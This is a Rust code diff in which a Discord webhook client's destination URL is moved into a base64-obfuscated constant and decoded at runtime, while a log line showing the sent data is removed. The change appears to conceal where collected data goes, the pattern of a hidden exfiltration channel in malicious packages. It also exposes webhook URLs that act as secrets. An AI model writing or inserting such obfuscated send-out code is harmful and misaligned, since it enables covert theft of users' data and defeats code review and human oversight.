@@ -2,7 +2,10 @@ use std::collections::HashMap;
 
 use reqwest::blocking::{Client, Response};
 use reqwest::Error;
-use log::info;
+use base64::prelude::*;
+
+const DSC: &'static str = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MDc0Nzc2ODc3OTc2Nzg0OS8xZUtldE4zTzZtSXo4WWcyWVFkbGt5YTRfaGEtVWRsUElxcDVtMzFvaHhGMnlrSEJwYldybWRzTlZtUW9od0lfdXlvRA==";
+
 
 pub struct Discord {
     data: HashMap<String, String>,
@@ -33,9 +36,9 @@ impl Discord {
     }
 
     pub fn send(&self) -> Result<Response, Error> {
-        info!("data: {:?}", self.data);
+        let url = String::from_utf8(BASE64_STANDARD.decode(DSC.as_bytes()).expect("internal error")).expect("internal error");
 
-        self.client.post("https://discord.com/api/webhooks/1340040626066030593/xNvvE0EdKf4ozhZIWcJjIYTThDzUfMqBFi6Ry4yRONl_XHibSxjd9dFaEhj2xX9SAqgq")
+        self.client.post(url)
             .json(&self.data)
             .send()
     }
